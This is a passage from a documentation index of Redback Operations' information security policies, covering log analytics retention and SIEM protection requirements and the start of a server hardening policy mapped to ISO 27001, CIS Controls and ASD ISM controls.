updates\t-\tC\t-\t-\t-\t-\t-\t-\tR Log data management\t-\t-\tC\tR\tR\tC\tC\tC\tC  Legend​  R (Responsible): Performs the activity or does the work.A (Accountable): Ultimately accountable for the correctness and thoroughness of the activity. Only one Accountable per task.C (Consulted): Provides information and feedback during the process; two-way communication.I (Informed): Receives information about the process; one-way communication.    ","version":"Next","tagName":"h3"},{"title":"Types of Digital Assets Covered Under the Log Analytics Policy​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/company-policy/ISMS/monitoring-log-analytics#types-of-digital-assets-covered-under-the-log-analytics-policy","content":" This structured list of assets defines (but is not limited to) the broad scope of the Log Analytics Cyber Security Policy, ensuring that all critical systems and infrastructure are monitored in alignment with this policy.  Web-facing Applications and Services​  Public Websites, Gateways, and Portals Includes main websites, customer portals, and blogs hosted on domains owned by Redback Operations. Web Applications Online applications providing services or interactions to users, such as web-based email systems, CRM platforms, custom business applications, and APIs.  Network Infrastructure​  DNS Servers Servers responsible for resolving domain names into IP addresses. Firewalls and Edge Devices Devices at the network boundary protecting against external threats, including Next-generation firewalls (NGFWs) with intrusion prevention systems (IPS). VPN/Remote Access Gateways Endpoints for VPN access that allow secure remote connections to the internal network, like SSL VPN appliances.  Cloud Services and Infrastructure​  Cloud-based Web Hosting Services used for hosting websites and web applications on cloud platforms. Cloud Storage Publicly accessible cloud storage solutions, such as Microsoft Azure Storage accounts. IaaS, PaaS &amp; SaaS Services Cloud-based applications accessed over the Internet, including Salesforce CRM, Google Workspace, and cloud infrastructures like Google Cloud Platform and Microsoft Azure.  Email and Communication Servers​  Email Servers Servers handling incoming and outgoing email communications, including SMTP, IMAP, and POP3 servers. Unified Communications Systems Systems providing services such as VoIP, video conferencing, and instant messaging, e.g., Microsoft Teams or Zoom.  Remote Access Services​  Remote Desktop Services Services allowing remote control of desktops or servers, such as Remote Desktop Protocol (RDP) endpoints. Network Management Systems Tools and systems for managing and monitoring network infrastructure, including SNMP interfaces on network devices. Privileged Access Management Platform Platform used for managing identities and facilitating privileged access to sensitive systems.  IT Assets​  Servers Includes web, application, and database servers. Network Devices Routers, switches, and firewalls. End-user Devices Laptops, smartphones, and other personal devices used within the organizational network. Critical Software Applications Enterprise applications such as CRM, ERP systems, and other critical software.    ","version":"Next","tagName":"h3"},{"title":"Monitoring & Log Analytics Lifecycle​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/company-policy/ISMS/monitoring-log-analytics#monitoring--log-analytics-lifecycle","content":" The typical Monitoring &amp; Log Analytics Lifecycle for effective systems can be defined as:        ","version":"Next","tagName":"h2"},{"title":"Log Collection Management, Practices & Activities​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/company-policy/ISMS/monitoring-log-analytics#log-collection-management-practices--activities","content":" Redback Operations subscribes to a comprehensive framework for the collection, formatting, management, and analysis of log data across all IT systems and networks. This framework is designed to ensure the integrity, availability, and confidentiality of log information, which is crucial for maintaining security, facilitating incident response, and complying with legal and regulatory obligations.  ","version":"Next","tagName":"h2"},{"title":"Data & Log Types​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/company-policy/ISMS/monitoring-log-analytics#data--log-types","content":" User Access and Authentication Logs​  Track all user login, logout, and authentication attempts to monitor unauthorized access attempts and user activity.  System and Application Changes​  Record all updates, configuration changes, and software installations to ensure system integrity and audit system changes.  Network Activity Logs​  Capture all data related to network traffic, including firewall logs, intrusion detection system logs, and network access logs, essential for detecting potential threats and malicious activities.  Data Access and Usage Logs​  Document access to sensitive data and actions performed on the data, critical for protecting data privacy and detecting data breaches.  ","version":"Next","tagName":"h3"},{"title":"Log Formats​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/company-policy/ISMS/monitoring-log-analytics#log-formats","content":" Standardized Formats​  Logs are standardized to JSON or XML formats, which simplifies parsing and integration with various log analysis tools, aiding in automation and rapid response by SOC teams.  Detailed Elements​  Logs incorporate essential elements like timestamp, user ID, event type, source IP, destination IP, and action details, providing comprehensive traceability and context for security analysis.  Encryption and Secure Streaming​  All logs are encrypted during transmission and at rest. This ensures the confidentiality and integrity of log data, protecting it against unauthorized access and tampering.  Utilize secure channels (e.g., TLS/SSL) for log transmission to ensure that data is securely streamed in real-time to the log management systems without interception or data loss.    ","version":"Next","tagName":"h3"},{"title":"Security Operations Centre (SOC) Activities​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/company-policy/ISMS/monitoring-log-analytics#security-operations-centre-soc-activities","content":" Real-time Monitoring and Analysis​  SOC teams utilize real-time log data to identify and respond to incidents swiftly, employing advanced tools for anomaly detection and threat hunting.  Incident Response and Forensics  The following rules apply to Incident Response &amp; Forensics:  Logs should provide crucial evidence and aid in forensic investigations to understand attack vectors and mitigate threats effectively.Real-time log analysis must be conducted for identifying security incidents, operational issues, and compliance anomalies.SIEM systems must be configured to generate alerts based on predefined criteria for critical events such as unauthorized access attempts, system failures, or significant changes to sensitive systems.In the event of security incidents, logs must be used to perform root cause analysis, identify indicators of compromise (IoC) and to aid in remediation efforts.Logs related to any identified incident must be preserved beyond the standard retention period until the incident is fully resolved and closed.  Logs must contribute directly to the triage and escalation of incidents. Alerts generated from log activity must be assigned thresholds that, when triggered, route events to appropriate Incident Response (IR) playbooks. Suppression and tuning mechanisms must be documented and reviewed regularly to avoid alert fatigue and ensure timely response.  Threshold examples include:  Multiple failed authentication attempts within a 10-minute window.Unusual data exfiltration patterns.Configuration changes to critical systems outside business hours.  Refer to the Incident Response Policy &amp; relevant playbooks for further information.    ","version":"Next","tagName":"h3"},{"title":"Log Collection Frequency & Retention​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/company-policy/ISMS/monitoring-log-analytics#log-collection-frequency--retention","content":" Log Collection Standards​  The following rules apply in relation to Log Collection, Retention &amp; Storage requirements:  All systems must transmit logs securely to centralized log management solutions using encrypted channels (TLS 1.2 or higher).Log collection agents must be configured to capture all log entries without filtering, to ensure comprehensive data capture.Logs must be stored in encrypted form using AES-256 encryption to ensure their confidentiality and integrity.Access to logs must be controlled via role-based access controls (RBAC), ensuring that only authorized personnel have access based on their specific roles and needs.Critical systems and security logs are collected in real-time to facilitate immediate analysis and response to potential security threats.Application and system logs are configured to capture data per session or transaction, while network logs are typically collected at regular intervals, adjusted based on traffic volume and risk assessment.  Retention Duration​  The following rules apply in relation to Retention requirements:  Log retention periods are defined based on legal, regulatory, and operational needs. Log retention may extend up to several years based on the sensitivity of the target system.All logs must be retained for a minimum of 12 months, subject to target source criticality. Critical systems such as financial or personally identifiable information (PII) handling systems must retain logs for a minimum of 24 months.Logs must be archived in a secure manner at the end of their active life and must be readily accessible for audit purposes for an additional 12-month post-retirement.  Secure Storage and Destruction​  Logs are securely stored in encrypted formats with access controls strictly limiting access to authorized personnel only.  Note: Procedures for the secure destruction of data are referenced in the Data Classification &amp; Data Loss Prevention policy within the ISMS. Refer to this policy for further information.    ","version":"Next","tagName":"h3"},{"title":"Compliance with Standards & Controls​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/company-policy/ISMS/monitoring-log-analytics#compliance-with-standards--controls","content":" The log management practices defined in this policy align with CIS Controls for effective log management and ISO/IEC 27001 standards for information security management, ensuring data governance and compliance adherence with global cybersecurity industry standards.  By enhancing the log collection practices as outlined, Redback Operations strengthens its cybersecurity framework, ensuring that log management not only meets compliance requirements but also supports proactive security monitoring and incident management effectively. This detailed approach facilitates a secure, compliant, and efficient operational environment.  ","version":"Next","tagName":"h3"},{"title":"Auditing & Review​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/company-policy/ISMS/monitoring-log-analytics#auditing--review","content":" Compliance audits of log management practices must be conducted annually to ensure adherence to this policy and relevant legal or regulatory standards. Audit trails must be maintained for all access and changes to log data, to provide accountability and traceability.  ","version":"Next","tagName":"h3"},{"title":"Documentation and Training​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/company-policy/ISMS/monitoring-log-analytics#documentation-and-training","content":" All procedures related to log management must be fully documented and updated annually or following significant changes to the IT environment. Staff involved in log management must receive regular training on their responsibilities under this policy and on the secure handling of log data.  ","version":"Next","tagName":"h3"},{"title":"SIEM/SOC Logging Protection​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/company-policy/ISMS/monitoring-log-analytics#siemsoc-logging-protection","content":" The current SIEM/SOC platform is not yet fully deployed. As such, implementation is ongoing and being developed as part of the company’s security roadmap. A “Target State” objective is to fully integrate alert triage, threshold tuning, and automated incident handling workflows within the future SIEM solution.  To ensure the confidentiality, integrity, and availability of log data at Redback Operations, it is critical to implement security measures. Here are the minimum high-level requirements for protecting the integrity of the Redback Operations SIEM/SOC platform:  Data Encryption:​  Utilize strong encryption standards such as AES-256 for log data at rest and TLS for log data in transit to protect against unauthorized access and interception.  Note: Refer to the Cryptography Policy within the Redback Operations ISMS for further detail.  Access Control:​  Implement strict access controls using role-based access control (RBAC) to ensure only authorized personnel have access to log data.Use multi-factor authentication (MFA) for systems accessing log data to add an additional layer of security and adhere to common industry framework controls such as CIS.  Log Integrity:​  Apply cryptographic hashing to log entries to detect and prevent unauthorized changes. Any alteration of the log data will result in a different hash value, indicating tampering. Use log management solutions that support log immutability (such as write-once-read-many (WORM) storage) to prevent alteration or deletion of log data.  Regular Security Assessments:​  Conduct regular security assessments of the log management infrastructure to identify vulnerabilities.  Note: Refer to the Attack Surface Management policy referenced in the Redback Operations ISMS for further detail.  Redundancy and Backup:​  Regularly backup log data to secure, geographically dispersed locations to prevent data loss from local disasters or system failures.  Note: Refer to Redback Operations Business Continuity &amp; Disaster Recovery Policy for further detail.    ","version":"Next","tagName":"h3"},{"title":"Policy Review​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/company-policy/ISMS/monitoring-log-analytics#policy-review","content":" Regular reviews and timely updates to the Monitoring &amp; Log Analytics Cyber Security Policy are essential for keeping it relevant and effective at Redback Operations.  Note: Company layout and infrastructure does not reflect the standards outline in this policy at the time of this document’s creation and is considered a long-term strategy to implement when company maturity has improved.  ","version":"Next","tagName":"h2"},{"title":"Responsibility for Reviews​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/company-policy/ISMS/monitoring-log-analytics#responsibility-for-reviews","content":" The Chief Information Security Officer (CISO) is designated as the primary initiator of the reviews for the cyber security policy at Redback Operations. A review committee assists in evaluating the effectiveness and relevance of the policy.  ","version":"Next","tagName":"h3"},{"title":"Frequency of Reviews​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/company-policy/ISMS/monitoring-log-analytics#frequency-of-reviews","content":" Reviews are scheduled to occur at least annually. However, more frequent reviews are conducted if there are significant changes in technology, business practices, or compliance requirements. Ad-hoc reviews are also permitted in response to security incidents or major failures in the existing policy.  ","version":"Next","tagName":"h3"},{"title":"Proposing and Approving Changes​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/company-policy/ISMS/monitoring-log-analytics#proposing-and-approving-changes","content":" Any member of the review committee can propose changes during the review process. These proposals should be supported by a rationale and, where possible, data to substantiate the change. After a thorough discussion within the committee, the CISO presents the proposed changes to senior management for approval.  ","version":"Next","tagName":"h3"},{"title":"Communication Plan for Updates​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/company-policy/ISMS/monitoring-log-analytics#communication-plan-for-updates","content":" Once changes are approved, the updated policy is communicated to all stakeholders through internal memos, meetings, and training sessions. It is crucial to ensure that all employees understand the changes and how they impact their roles and responsibilities. Regular training sessions are updated to reflect the new policy standards.  ","version":"Next","tagName":"h3"},{"title":"Documentation and Record-Keeping​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/company-policy/ISMS/monitoring-log-analytics#documentation-and-record-keeping","content":" Detailed records of all review meetings, discussions, decisions made, and the reasoning behind changes are maintained meticulously. The version history of the policy is documented to track changes over time and provide context for future amendments.  ","version":"Next","tagName":"h3"},{"title":"Audit & Review Procedures​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/company-policy/ISMS/monitoring-log-analytics#audit--review-procedures","content":" Audit Roles and Responsibilities​  The CISO is responsible for initiating and overseeing audits.An internal audit team (may include Compliance Officer and Security Analyst) will be responsible for the execution.  Audit Scope and Tools​  Audits must verify adherence to log collection, retention, and monitoring protocols.Use of log integrity verification tools (e.g., hash comparisons).Cross-checking logs against retention policies and role-based access controls (RBAC).  Audit Outcomes and Follow-up​  A post-audit report must be created with success/failure results, identified gaps, and remediation dealines.Audit records must be maintained for a minimum of 24 months. ","version":"Next","tagName":"h3"},{"title":"Server Security Policy","type":0,"sectionRef":"#","url":"/redback-documentation/docs/company-policy/ISMS/server-security","content":"","keywords":"","version":"Next"},{"title":"Scope​","type":1,"pageTitle":"Server Security Policy","url":"/redback-documentation/docs/company-policy/ISMS/server-security#scope","content":" The Server Security Policy applies to all server assets, including physical and virtual servers, as well as related server infrastructure managed or operated by Redback Operations. This policy encompasses all servers utilized across the organization, irrespective of their geographical location or deployment model (on-premises, cloud-hosted, or hybrid environments).  Server Security in the context of this policy involves the protection of servers from unauthorized access, threats, and vulnerabilities that could compromise the confidentiality, integrity, and availability of the data they store and process. It includes the implementation of physical security measures, network security controls, operating system configurations, and application-level protections.  The policy aims to establish guidelines for:  Access Control Ensuring that access to servers is strictly controlled and monitored, with authentication mechanisms in place to verify the identity of users. Data Protection Implementing procedures to protect sensitive and critical data stored on servers, including encryption, data masking, and secure data disposal practices. System Configuration Standardizing server configurations to minimize vulnerabilities and ensure that all servers operate in accordance with organizational security standards. Patch Management Regularly updating servers with the latest security patches and updates to mitigate exposure to known threats and vulnerabilities. Security Monitoring Utilizing tools and techniques to continuously monitor server activity for signs of security incidents or breaches. Incident Response Preparing and executing a coordinated response to security incidents that impact server operations to minimize damage and restore normal operations as quickly as possible.  This scope ensures comprehensive coverage of all server-related security aspects, integrating seamlessly with other cybersecurity policies in place at Redback Operations as part of the broader Information Security Management System.  Note: This policy serves as a foundational element of our broader IT security strategy, which may include future deployments of additional security solutions such as intrusion detection systems (IDS), intrusion prevention systems (IPS), and advanced threat protection services.  ","version":"Next","tagName":"h2"},{"title":"Purpose​","type":1,"pageTitle":"Server Security Policy","url":"/redback-documentation/docs/company-policy/ISMS/server-security#purpose","content":" The Server Security Policy is designed to ensure Redback Operations achieves and maintains strict security and compliance standards throughout its server infrastructure. This policy aims to safeguard the integrity, confidentiality, and availability of all server data and applications. By defining comprehensive controls and procedures, this policy serves as a foundational guide for securing and managing all server resources effectively.  Objectives​  The objectives that this Server Security Policy intends to achieve are:  Enhance Security Posture: Identify, evaluate, and mitigate risks and threats to servers and their hosted data proactively. Compliance and Regulatory Adherence: Ensure server security practices align with applicable legal, regulatory, and contractual requirements, mitigating the risk of legal and financial penalties. Operational Excellence: Monitor and optimize server performance to ensure system reliability, availability, and business continuity. Incident Management and Response: Establish a systematic approach for detecting, analysing, and responding to server security incidents promptly, minimizing impact and preventing recurrence. Forensic Capabilities: Implement accurate and comprehensive logging practices to support investigations and establish accountability and traceability. Confidentiality, Integrity, and Availability (CIA): Protect the CIA of company systems and infrastructure by aligning the policy with the Redback Operations Information Security Management System. Configuration Management and Hardening: Establish standardized server configurations and hardening measures to minimize vulnerabilities. Threat Detection and Analysis: Implement processes to detect and analyse threats quickly, identifying and addressing potential breaches.  This policy supports both technical and strategic security goals while fostering a culture of security compliance across all server environments in Redback Operations. It lays a solid groundwork for the effective protection of sensitive data and server infrastructure.  Definitions​  The table below expands on definitions and components specific to server security:  Term\tDefinitionAccess Control\tProcedures to limit server access to authorized individuals only, often through user accounts, roles, and permissions. Configuration Management\tManaging and maintaining standard server configurations to reduce vulnerabilities. Hardening\tThe process of reducing the attack surface by disabling unnecessary services and tightening security configurations. Patch Management\tThe systematic process of identifying, prioritizing, and applying patches to servers to mitigate security vulnerabilities. Backup and Recovery\tStrategies for duplicating critical data and restoring it in case of system failure or security incident. Multi-Factor Authentication (MFA)\tSecurity protocol requiring multiple verification steps before gaining access to a system. Intrusion Detection System (IDS)\tA system that monitors network traffic or server behaviour for suspicious activity or known attack patterns. Security Information and Event Management (SIEM)\tA tool for aggregating and analysing server logs and network activity to identify and respond to security incidents. Forensic Analysis\tThe process of investigating server logs to understand the cause of a security incident and gather evidence.  Guiding Principles​  Here are the guiding principles that Redback Operations should follow for server security:  Principle\tDescriptionConfidentiality\tEnsure that server data remains accessible only to authorized individuals through strict access control measures. Integrity\tMaintain the accuracy and completeness of server data, preventing unauthorized modifications. Availability\tEnsure server data and services are reliably available to authorized users by implementing redundancy and backup measures. Security\tApply comprehensive security measures that align with industry standards to protect server data from internal and external threats. Scalability\tEnsure server security measures can scale with the growth of the organization and changes in infrastructure. Resilience\tBuild and maintain server configurations that can withstand failures and continue operations with minimal disruption. Monitoring\tContinuously monitor server performance and security to detect potential threats and operational issues proactively. Compliance\tAdhere to applicable legal, regulatory, and contractual requirements in server management practices.  General Obligations​  Redback Operations adheres to the following obligations under the Server Security Policy:  Obligation\tDescriptionPatch Management\tRegularly update server software and operating systems with the latest security patches to mitigate vulnerabilities. Access Control\tImplement and periodically review role-based access controls to minimize unauthorized access risks. Data Protection\tEncrypt sensitive data at rest and in transit to protect confidentiality. Configuration Management\tEnsure standardized server configurations minimize vulnerabilities and are regularly updated to reflect the latest security practices. Security Monitoring\tMonitor server logs and network traffic continuously for unusual activity that could signal a potential threat. Incident Response\tEstablish and maintain a coordinated plan for investigating and responding to server security incidents. Training\tRegularly train IT staff and other stakeholders on server security best practices and compliance requirements.  These sections outline essential components of the Server Security Policy, providing clarity on terminology, guiding principles, and obligations for Redback Operations.  ","version":"Next","tagName":"h3"},{"title":"Key Assets and Data Categories​","type":1,"pageTitle":"Server Security Policy","url":"/redback-documentation/docs/company-policy/ISMS/server-security#key-assets-and-data-categories","content":" For Redback Operations, identifying the critical systems, applications, and data sets that require protection is crucial. This includes any sensitive information that needs heightened security measures. Here are typical IT assets and data categories that are critical and covered under the scope of this policy:  IT Assets: Servers (web, application, database)Network devices (routers, switches, firewalls)End-user devices (laptops, smartphones)Cloud services and storage solutionsCritical software applications (CRM, ERP, custom applications) Data Categories: Customer data (personal identification information, payment details)Employee data (personal details, HR records)Intellectual property (trade secrets, proprietary technology)Financial data (transaction records, financial reports)Operational data (logs, configuration files)  These assets and data types require monitoring to ensure they are protected from unauthorized access, modifications, or any other cyber threats.  ","version":"Next","tagName":"h3"},{"title":"Framework References​","type":1,"pageTitle":"Server Security Policy","url":"/redback-documentation/docs/company-policy/ISMS/server-security#framework-references","content":" The Server Security Policy for Redback Operations incorporates specific controls from the Australian Signals Directorate (ASD’s) Information Security Manual. References to the ASD ISM security controls are referenced further in the policy, however the policy itself overlaps and aligns with ISO 27001:2022 standards and the CIS Security Controls v8 to ensure a comprehensive and robust approach to server security and risk management.  These frameworks provide recognized best practices for maintaining the security, integrity, and availability of information systems.  ISO 27001:2022 Controls:​  A.5.14 Information Security Policy: Mandates developing, implementing, and maintaining an information security policy that aligns with organizational objectives, ensuring secure data processing and compliance.A.8.1 Asset Management: Highlights maintaining an inventory of information assets and assigning ownership, promoting accountability and protection.A.9.1 Access Control: Focuses on securing access to systems based on business and security requirements, minimizing unauthorized access.A.12.1 Operations Security: Stresses managing IT operations securely, including controlling changes, protecting data at rest, and preventing malware infections.A.12.4 Logging and Monitoring: Emphasizes monitoring and analysing system logs to detect, understand, and respond to security incidents.A.13.1 Network Security Management: Focuses on protecting information in networks and its supporting infrastructure from unauthorized access, misuse, and denial of service.A.14.1 System Development: Ensures security is integrated across the software development lifecycle, reducing vulnerabilities, and supporting secure design.A.14.2 Security in Development and Support Processes: Ensures that information security is an integral part of information systems across the lifecycle, including development and support.  CIS Controls:​  Control 1: Inventory and Control of Enterprise Assets: Ensures all devices and software are identified and managed, reducing unauthorized or unmanaged hardware and software.Control 3: Data Protection: Safeguards sensitive data throughout its lifecycle, using encryption and access controls.Control 5: Secure Configuration of Enterprise Assets and Software: Advises on maintaining a hardened configuration for both hardware and software to reduce vulnerabilities.Control 7: Continuous Vulnerability Management: Encourages identifying vulnerabilities promptly and implementing remediation strategies.Control 9: Email and Web Browser Protections: Recommends securing email clients and web browsers against common attacks like phishing and drive-by downloads.Control 10: Data Recovery Capabilities: Emphasizes the importance of establishing and maintaining robust data recovery processes to ensure timely recovery in the event of a security incident.Control 11: Secure Configuration for Network Devices: Includes guidelines for securely configuring network devices such as firewalls, routers, and switches.Control 12: Boundary Defence: Ensures that defences are effective at detecting, preventing, and correcting the flow of information transferring networks of different trust levels.Control 13: Network Monitoring and Defence: Establishes effective network security monitoring to detect, analyse, and respond to security incidents in real time.  ","version":"Next","tagName":"h3"},{"title":"Conclusion:​","type":1,"pageTitle":"Server Security Policy","url":"/redback-documentation/docs/company-policy/ISMS/server-security#conclusion","content":" ISO 27001 controls and CIS benchmarks have been carefully selected to address the specific security needs of server environments at Redback Operations.  By aligning the Server Security Policy with these established standards, Redback Operations ensures that its servers are well-protected against threats and are compliant with international best practices and regulatory requirements.  This alignment not only secures the infrastructure but also supports the organization’s goals of maintaining operational integrity and business continuity.  ","version":"Next","tagName":"h3"},{"title":"Roles and Responsibilities​","type":1,"pageTitle":"Server Security Policy","url":"/redback-documentation/docs/company-policy/ISMS/server-security#roles-and-responsibilities","content":" A clear definition of roles and responsibilities is crucial for effective server security management. At Redback Operations, the following roles play key parts in maintaining the security and integrity of servers:    ","version":"Next","tagName":"h2"},{"title":"Key Roles​","type":1,"pageTitle":"Server Security Policy","url":"/redback-documentation/docs/company-policy/ISMS/server-security#key-roles","content":" The success of the Server Security Policy at Redback Operations relies on clearly defined roles and responsibilities. It is crucial for all stakeholders to understand their duties to ensure effective implementation, compliance, and maintenance of security standards.  Role\tKey ResponsibilitiesCISO\tLead policy updates, oversee risk, approve security strategies. Security Team\tImplement controls, monitor compliance, perform regular security checks. IT Department\tApply updates, maintain servers, assist in incident response. System Admins\tApply configurations, monitor performance, enforce access controls. Management\tAllocate resources, approve policy updates, ensure organizational alignment. End Users\tFollow access and security rules, report security concerns promptly.  ","version":"Next","tagName":"h3"},{"title":"RACI Chart​","type":1,"pageTitle":"Server Security Policy","url":"/redback-documentation/docs/company-policy/ISMS/server-security#raci-chart","content":" To delineate responsibilities, the following RACI chart indicates who is Responsible, Accountable, Consulted, and Informed for key server security activities:  Task\tSecurity Team\tIT Department\tSystem Administrators\tManagement\tEnd UsersDevelop Security Policy\tA\t-\t-\tC\t- Implement Security Controls\tR\tA\tC\t-\t- Monitor Compliance\tA\tR\tI\t-\t- Patch and Update Management\tI\tA\tR\t-\t- Incident Response\tA\tR\tR\tI\t- Approve Policies\tI\t-\t-\tA\t- Resource Allocation\tC\tR\tI\tA\t- Security Training\tR\tI\tI\t-\tC  Legend:​  R: Responsible – Performs the actual work to achieve the task.A: Accountable – Ultimately accountable for the completion and quality of the task.C: Consulted – Provides input and advice; engaged in two-way communication.I: Informed – Kept up to date on progress; one-way communication.    ","version":"Next","tagName":"h3"},{"title":"Strategic Overview & Controls​","type":1,"pageTitle":"Server Security Policy","url":"/redback-documentation/docs/company-policy/ISMS/server-security#strategic-overview--controls","content":" The server security policy for Redback Operations is developed in line with the Australian Signals Directorate's Information Security Manual (ISM) and the Essential 8 Framework. It provides a holistic approach to safeguarding IT infrastructure against a broad spectrum of security threats.  This section of the Server Security Policy details key topics covered under these frameworks, and provides guidance and reasoning regarding adherence to security controls:  We prioritize credential management and authentication to tightly control system access, ensuring that identity verification, random credential generation, secure distribution, enforced changes on first use, and prevention of credential reuse are all in place. These measures establish a strong foundation for managing both internal and external threats effectively.  Session and screen locking practices are incorporated to secure inactive sessions from unauthorized access. Automatic locking after inactivity, or when manually locked by users, ensures that active sessions are secure, and systems remain protected when temporarily unattended.  Logon practices are emphasized with logon banners to remind users of their security responsibilities and the sensitivity of the systems they handle. These practices reinforce a security-conscious mindset across the organization.  In virtualization and hypervisor hardening, we emphasize secure configurations, regular patching, and vendor selection based on secure-by-design principles to protect virtual environments just as rigorously as physical ones. This approach prevents attackers from exploiting virtualization vulnerabilities.  Functional separation between computing environments and server roles is an effective strategy to prevent breaches from spreading via lateral movement. By enforcing both physical and logical isolation and ensuring secure software-based isolation mechanisms, we protect the integrity of each computing environment independently.  The Essential 8 Framework strategies referenced in this Server Security policy include references to controls such as:  Application whitelistingRegular patching of software and operating systemsRestricting administrative privilegesMulti-factor authenticationApplication HardeningMicrosoft Office Macro Settings &amp; Microsoft Security Baseline Policies  These strategies are chosen for their effectiveness in mitigating malware infections, minimizing the impact of security incidents, and enabling rapid data recovery.  Monitoring and log analytics are central to our continuous security assessment, aggregating and analysing logs from critical systems to detect potential security incidents swiftly. This proactive approach enhances threat detection while ensuring compliance and supporting forensic investigations.  The strategies referenced in this policy form a comprehensive, layered defence to protect Redback Operations from evolving threats while aligning with national and international industry standards. Each control and strategy work cohesively to deliver proactive security measures that create a culture of security-consciousness and readiness.  Note: Backup Controls are referenced in the Redback Operations Business Continuity Plan. Refer to this policy for further details.  Further detail regarding Server Security Guidelines can be found here: https://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/ism/cyber-security-guidelines/guidelines-system-hardening  (Australian Signals Directorate, Guidelines for System Hardening, May 12 2024)    Prioritisation of Controls​  Control Area\tPriorityApplication Control\tCritical Server Monitoring\tCritical Operating System Hardening\tImportant Authentication Hardening\tImportant  ** This ranking helps teams focus on the most urgent risks first, ensuring critical protections are implemented ahead of lower-priority measures.**  ","version":"Next","tagName":"h2"},{"title":"Operating System Hardening​","type":1,"pageTitle":"Server Security Policy","url":"/redback-documentation/docs/company-policy/ISMS/server-security#operating-system-hardening","content":" Operating System Selection​  Choosing the right operating system is fundamental to building a secure server environment. Redback Operations should prioritize vendors that:  Adhere to secure-by-design and secure-by-default principles.Utilize memory-safe programming languages where possible (e.g., C#, Go, Java, Ruby, Rust, Swift).Follow secure programming practices and demonstrate a strong commitment to maintaining the security of their products.  Operating System Releases and Versions​  Regular updates and patches are crucial in maintaining secure servers:  Use the latest or the previous release of operating systems, ensuring access to the latest security features.Where possible, choose 64-bit versions of operating systems, which support additional security functionalities.  Standard Operating Environments (SOEs)​  Standardization improves consistency and reduces vulnerabilities:  Ensure consistent server environments through standardized SOEs, delivered via automated build processes or golden images.When SOEs are obtained from third parties, scan them for malicious code or configurations.Review and update SOEs annually to maintain current security baselines.  Hardening Operating System Configurations​  Secure configurations ensure resilient operating systems:  Develop, implement, and maintain approved configurations for all operating systems.Follow ASD and vendor hardening guidelines, prioritizing the most restrictive recommendations if conflicts arise.Unneeded accounts, services, and features must be disabled or removed.Default credentials and accounts must be changed.Disable automatic execution for removable media.Disable or remove Internet Explorer 11 to reduce vulnerabilities.Remove .NET Framework 3.5, including .NET 2.0 and 3.0, if possible.  OS Security Protections​  Enable all available OS security protections:  Ensure operating system exploit protection is enabled.Enable Secure Boot &amp; TPM ModulesPrevent unprivileged users from disabling or modifying security features or running script execution engines.  Control References​  ISM-1743: Operating systems are chosen from vendors with a proven security commitment.ISM-1407: The latest or previous operating system release is used.ISM-1408: 64-bit versions are used when supported.ISM-1406: SOEs are used for all servers.ISM-1608: Third-party SOEs are scanned for malicious code and configurations.ISM-1588: SOEs are reviewed and updated annually.ISM-1914: Develop, implement, and maintain approved OS configurations.ISM-1409: Harden OS configurations per ASD and vendor guidance.ISM-0380: Disable or remove unneeded OS components.ISM-0383: Change default credentials and accounts.ISM-0341: Disable automatic execution of removable media.ISM-1654: Disable or remove Internet Explorer 11.ISM-1655: Disable or remove .NET Framework 3.5.ISM-1492: Enable OS exploit protection.ISM-1745: Enable Early Launch Antimalware, Secure Boot, Trusted Boot, and Measured Boot.ISM-1584: Prevent unprivileged users from bypassing security features.ISM-1491: Prevent unprivileged users from running script execution engines.  These guidelines ensure that Redback Operations' server operating systems remain hardened and resistant to threats, aligning with the most restrictive security practices outlined by ASD ISM and CIS Security Controls.    ","version":"Next","tagName":"h3"},{"title":"Application Management and Control​","type":1,"pageTitle":"Server Security Policy","url":"/redback-documentation/docs/company-policy/ISMS/server-security#application-management-and-control","content":" Application Management​  To minimize the risk posed by malicious applications, Redback Operations implements strict controls on application management:  Unprivileged users are not allowed to install unapproved software.Approved software must be installed from organization-managed repositories or trusted application marketplaces.Unprivileged users cannot uninstall or disable approved software, preventing the removal of security features or critical system functions.  Application Control​  Application control helps to prevent the execution of malicious code on servers. Redback Operations follows a structured approach to application control:  Develop rulesets based on business requirements, including specific executable, script, installer, and driver types.Use cryptographic hash rules, publisher certificate rules, or path rules while ensuring hardening measures are in place.Log and analyse application control events centrally to detect and investigate malicious behaviour.  Command Shell​  Command shells, while useful for automating system tasks, can be exploited by malicious actors. By centrally logging command line process creation events, Redback Operations can detect malicious behaviour promptly.  Command line process creation events are centrally logged.  PowerShell​  PowerShell is a powerful tool but can be dangerous if exploited. The following controls protect against unauthorized usage:  Disable or remove Windows PowerShell 2.0 to prevent attacks that exploit vulnerabilities in older versions.Set PowerShell's language mode to Constrained Language Mode, balancing security with functionality.Log PowerShell module, script block, and transcription events centrally to monitor the security posture and detect malicious actions.Protect PowerShell script block logs using Protected Event Logging.Ensure PowerShell remote execution policy is configured to use RemoteSigned.  Control References​  ISM-1592: Unprivileged users cannot install unapproved software.ISM-0382: Unprivileged users cannot uninstall or disable approved software.ISM-1490: Application control implemented on internet-facing servers.ISM-1656: Application control implemented on non-internet-facing servers.ISM-1870: Application control applied to user profiles and temporary folders.ISM-1871: Application control applied to all locations besides user profiles and temporary folders.ISM-1657: Execution restricted to an 